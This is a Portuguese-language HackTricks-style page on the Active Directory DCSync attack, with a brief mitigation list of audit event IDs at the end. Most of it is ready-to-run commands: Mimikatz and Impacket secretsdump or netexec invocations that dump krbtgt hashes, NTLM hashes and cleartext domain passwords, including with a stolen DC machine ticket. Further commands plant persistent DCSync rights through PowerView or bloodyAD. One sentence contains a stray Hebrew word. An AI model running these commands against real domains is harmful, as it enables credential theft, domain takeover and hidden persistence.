# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

A permissão **DCSync** implica ter estas permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.

**Notas Importantes sobre DCSync:**

- O ataque **DCSync simula o comportamento de um Domain Controller e pede a outros Domain Controllers para replicar informação** usando o Directory Replication Service Remote Protocol (MS-DRSR). Como o MS-DRSR é uma função válida e necessária do Active Directory, ele não pode ser desativado ou disabled.
- Por padrão, apenas os grupos **Domain Admins, Enterprise Admins, Administrators e Domain Controllers** têm os privilégios necessários.
- Na prática, **full DCSync** precisa de **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** no domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` é comumente delegated em conjunto com eles, mas sozinho é mais relevante para sincronizar **confidential / RODC-filtered attributes** (por exemplo, secrets no estilo legacy LAPS) do que para um dump completo de krbtgt.
- Se qualquer senha de conta estiver armazenada com reversible encryption, há uma opção disponível no Mimikatz para retornar a senha em clear text

### Enumeration

Verifique quem tem essas permissões usando `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Se você quiser focar em **non-default principals** com direitos DCSync, filtre os grupos integrados com capacidade de replicação e revise apenas os trustees inesperados:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploite Localmente
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explorar Remotamente
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Exemplos práticos com escopo definido:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync usando um TGT de máquina do DC capturado (ccache)

Em cenários de export-mode de unconstrained-delegation, você pode capturar um TGT de máquina de um Domain Controller (por exemplo, `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Você pode então usar esse ccache para autenticar como o DC e לבצע DCSync sem uma senha.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas operacionais:

- **O caminho Kerberos do Impacket toca o SMB primeiro** antes da chamada DRSUAPI. Se o ambiente impõe **validação do nome de destino do SPN**, um dump completo pode falhar com `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Nesse caso, solicite primeiro um ticket de serviço **`cifs/<dc>`** para o DC de destino ou recorra a **`-just-dc-user`** para a conta de que você precisa imediatamente.
- Quando você só tem direitos de replicação mais baixos, a sincronização estilo LDAP/DirSync ainda pode expor atributos **confidential** ou **RODC-filtered** (por exemplo, o legado `ms-Mcs-AdmPwd`) sem uma replicação completa do krbtgt.

`-just-dc` gera 3 arquivos:

- um com os **hashes NTLM**
- um com as **chaves Kerberos**
- um com senhas em cleartext do NTDS para quaisquer contas configuradas com [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitada. Você pode obter usuários com reversible encryption com

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Se você é domain admin, pode conceder essas permissões a qualquer usuário com a ajuda de `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Operadores Linux podem fazer o mesmo com `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Então, você pode **verificar se o usuário foi corretamente atribuído** aos 3 privilégios procurando por eles na saída de (você deverá conseguir ver os nomes dos privilégios dentro do campo "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigação

- Security Event ID 4662 (Audit Policy for object must be enabled) – Uma operação foi realizada em um objeto
- Security Event ID 5136 (Audit Policy for object must be enabled) – Um objeto do directory service foi modificado
- Security Event ID 4670 (Audit Policy for object must be enabled) – As permissões em um objeto foram alteradas
- AD ACL Scanner - Crie e compare relatórios de criação de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
